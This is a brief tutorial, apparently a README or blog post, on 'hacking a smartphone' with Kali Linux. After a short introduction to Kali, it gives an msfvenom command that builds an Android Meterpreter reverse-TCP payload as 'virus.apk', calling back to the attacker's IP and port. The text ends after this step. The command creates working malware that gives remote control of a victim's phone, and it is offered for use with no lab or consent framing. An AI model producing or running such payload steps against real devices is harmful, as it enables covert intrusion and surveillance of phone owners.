# How to hack a smarphone with Kali Linux (complete guide)
Kali linux is an OS that is focused on pentesting and ethical hacking. It if totally free and open source.

**More info at https://www.kali.org/**

## Creating the maliciuos file
The first thing that we need to make, is to create a malicious file with the correct parameters as for making a connection between our computer and the affected device.
#### `msfvenom -p android/meterpreter/reverse_tcp LHOST=(ENTER YOUR IP ADRESS WITHOUT THE BRACKETS) LPORT=8080  R> virus.apk`


